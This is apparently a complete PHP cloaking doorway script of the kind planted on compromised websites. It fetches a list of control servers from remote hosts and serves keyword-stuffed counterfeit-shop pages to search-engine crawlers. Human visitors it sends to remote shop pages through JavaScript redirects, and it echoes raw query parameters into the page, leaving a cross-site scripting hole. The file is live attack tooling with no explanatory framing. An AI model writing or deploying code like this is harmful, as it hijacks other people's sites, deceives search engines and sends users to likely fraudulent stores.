<?php
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
$kgurl="https://ilx01.com/1.txt";
$kgurl2="http://ilx01.top/jd1.txt";
$allurl =file_get_contents($kgurl);
if(!$allurl){$allurl=file_get_contents($kgurl2);}
$words = explode("|", $allurl);
foreach ($words  as  $value){
$aaa =file_get_contents($value.'test.txt');if(!$aaa){continue;}else{$jd=$value;break;	}}
$jd=str_replace('https://',$http_type,$jd);
if (!is_null($_GET['s'])) {
	$cid = "";
	if (!is_null($_GET['cid'])) {
		$cid = $_GET['cid'];
	}
	$url = $jd . "sjd.aspx?cid=" . $cid . "&number=" . $_GET['number'] . "&pnum=" . $_GET['pnum'];
	$str = file_get_contents($url);
	$str = str_replace('yymm', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
	header("Content-type:text/xml");
	echo $str;
	exit();
}
$kname = "";
if (!is_null($_GET['iid'])) {
	$kname = file_get_contents($jd . "gn.aspx?iid=" . $_GET['iid']);
}
function check($ip)
{
	global $jd;
	if (!is_null($_GET['kk'])) {
		$ip = "66.249.64.190";
	}
	$domain = file_get_contents($jd . "getdomain.aspx?rnd=1&ip=" . $ip);
	if (stripos($domain, 'google') != false or stripos($domain, 'msn.com') != false or stripos($domain, 'yahoo.com') != false or stripos($domain, 'aol.com') != false) {
	} else {
		if (!is_null($_GET['iid'])) {
			$kname = file_get_contents($jd . "gn.aspx?iid=" . $_GET['iid']);
			echo '<script>document.location="' . $jd . "a.aspx" . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($kname) . '"</script>';
			exit();
		}
		if (!is_null($_GET['searchtxt'])) {
			echo '<script>document.location="' . $jd . "a.aspx" . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($_GET['searchtxt']) . '"</script>';
			exit();
		}
		if (!is_null($_GET['pnum'])) {
			$txt = str_replace("products.aspx", "", $jd . "a.aspx") . "?cid=" . $_GET['cid'] . "";
			echo '<script>document.location="' . $txt . '"</script>';
			exit();
		}
	}
}
function getIP()
{
	$ip = $_SERVER['REMOTE_ADDR'] . "*" . $_SERVER['REMOTE_HOST'] . "*" . $_SERVER['HTTP_CLIENT_IP'] . "*" . $_SERVER['HTTP_X_FORWARDED'] . "*" . $_SERVER['HTTP_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_FORWARDED'];
	return $ip;
}
$validate = check(getIP());
?>
<html>

<head>

	<title> <?php error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
			echo $kname ?><?php echo $_GET['searchtxt'] ?> Cheaper Than Retail Price> Buy Clothing, Accessories and lifestyle products for women & men -<?php echo $_GET['pnum'] ?> </title>
	<meta name="keywords" content="<?php echo $kname ?><?php echo $_GET['searchtxt'] ?>" />
	<meta name="description" content=" Soldes OFF-<?php echo mt_rand(50, 70) ?>% <?php echo $kname ?> creates a better shopping experiences for customers, improves your conversion rate, and drives repeat business | <?php echo $_GET['searchtxt'] ?>" />
	<meta name="robots" content="index,follow,all" />
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>

<body>

	<?php
	$url = "";
	$hyzhdy = $jd . "SJ/JDNEW.aspx";
	if (!is_null($_GET['type'])) {

		if ($_GET['type'] == "search") {

			$url = $hyzhdy . "?cid=" . $_GET['cid'] . "&searchtxt=" . urlencode($_GET['searchtxt']);
			$str = file_get_contents($url);
			$str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
			echo  $str;
		}
	} else {

		if (!is_null($_GET['iid'])) {
			$url = $hyzhdy . "?iid=" . $_GET['iid'] . "&mt=" . $jd . "enm.txt&cid=" . $_GET['cid'] . "&yt=" . $jd . "ytb.txt&you=1";
		} else {
			$cid = "";
			if (!is_null($_GET['cid'])) {
				$cid = $_GET['cid'];
			}
			$url = $hyzhdy . "?cid=" . $cid . "&pnum=" . $_GET['pnum'];
		}
		$str = file_get_contents($url);
		$str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
		$str = str_replace('HHHHH', $_SERVER['SCRIPT_NAME'], $str);
		$str = str_replace('BBBBB', $_SERVER['HTTP_HOST'], $str);
		$str = str_replace('NNNNN', $kname . $_GET['iid'], $str);
		$str = str_replace('SSSSS', $kname . $_GET['iid'] . $_GET['searchtxt'] . $_GET['pnum'], $str);
		$str = str_replace('DDDDD', $kname . " Gold White Black Red Blue Beige Grey Price Rose Orange Purple Green Yellow Cyan Bordeaux pink Indigo Brown Silver " . $_GET['searchtxt'], $str);
		echo $str;
	}
	?>

</body>

</html>